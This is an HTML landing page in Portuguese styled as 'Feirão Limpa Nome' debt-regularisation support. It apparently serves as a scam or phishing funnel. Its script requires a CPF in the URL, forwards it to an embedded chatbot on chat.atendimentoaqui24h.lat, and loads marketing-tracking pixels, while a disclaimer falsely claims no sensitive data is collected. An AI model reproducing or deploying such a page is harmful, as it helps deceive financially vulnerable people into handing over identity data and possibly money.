<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Atendimento - Feirão Limpa Nome</title>
  <link href="https://fonts.bunny.net/css2?family=Inter:wght@300;400;700&display=swap" rel="stylesheet">
  <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-subids async defer></script>
  <script>
    window.pixelId = "67f846e3e19eff9c461bb215";
    var a = document.createElement("script");
    a.setAttribute("async", "");
    a.setAttribute("defer", "");
    a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
    document.head.appendChild(a);
  </script>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    html, body {
      height: 100%;
      font-family: Inter, sans-serif;
      background: #F5F7FA;
      color: #333;
    }
    .page {
      max-width: 430px;
      margin: 0 auto;
      min-height: 100vh;
      min-height: 100dvh;
      display: flex;
      flex-direction: column;
      background: #FCE6EF;
      padding: 20px;
    }
    .card {
      background: #FFF5F8;
      border-radius: 16px;
      padding: 20px;
      margin-bottom: 20px;
      box-shadow: 0 2px 8px rgba(0,0,0,0.06);
    }
    .card h2 {
      text-align: center;
      color: #A3005A;
      font-size: 20px;
      font-weight: 700;
      margin-bottom: 12px;
    }
    .card p {
      text-align: center;
      font-size: 15px;
      line-height: 1.5;
    }
    .chat-wrapper {
      flex: 1;
      display: flex;
      flex-direction: column;
      min-height: 440px;
      margin-bottom: 24px;
    }
    #chat-iframe {
      width: 100%;
      flex: 1;
      min-height: 440px;
      border: none;
      border-radius: 12px;
      background: #fff;
    }
    .disclaimer {
      font-size: 13px;
      background: #fff;
      padding: 16px;
      border-radius: 12px;
      border-left: 4px solid #E80070;
      margin-bottom: 28px;
      line-height: 1.5;
    }
    footer {
      text-align: center;
      font-size: 12px;
      color: #666;
      padding-bottom: 12px;
    }
    footer a { color: #666; text-decoration: none; }
    #loading {
      position: absolute;
      inset: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      background: #FCE6EF;
      z-index: 5;
    }
    .spinner {
      width: 36px;
      height: 36px;
      border: 3px solid #f0f0f0;
      border-top-color: #E80070;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    .chat-container { position: relative; flex: 1; min-height: 440px; }
  </style>
</head>
<body>
  <div class="page">
    <div class="card">
      <h2>Etapas para consulta</h2>
      <p>Converse com o atendente para verificar sua situação e participar do Feirão Limpa Nome.</p>
    </div>

    <div class="chat-wrapper">
      <div class="chat-container">
        <div id="loading"><div class="spinner"></div></div>
        <iframe
          id="chat-iframe"
          title="Atendimento"
          allow="clipboard-write; microphone; camera"
          allowfullscreen
        ></iframe>
      </div>
    </div>

    <p class="disclaimer">
      Esta plataforma visa orientar os cidadãos sobre a regularização de registros financeiros em território nacional. Não coletamos dados sensíveis e atuamos de forma responsável e educativa.
    </p>

    <footer>
      <a href="#">Política de privacidade</a> |
      <a href="#">Termos de uso</a> |
      <a href="#">Contato</a>
    </footer>
  </div>

  <script>
    (function () {
      // URL do SEU Typebot (arquivo taypebot) — configure o DNS de chat.atendimentoaqui24h.lat
      var CHAT_URL = "https://chat.atendimentoaqui24h.lat/home";
      var params = window.location.search;

      if (!params.includes("cpf=")) {
        window.location.replace("/cpf" + params);
        return;
      }

      var iframe = document.getElementById("chat-iframe");
      var loading = document.getElementById("loading");

      iframe.src = CHAT_URL + params;

      iframe.addEventListener("load", function () {
        loading.style.display = "none";
      });

      setTimeout(function () {
        loading.style.display = "none";
      }, 8000);
    })();
  </script>
</body>
</html>
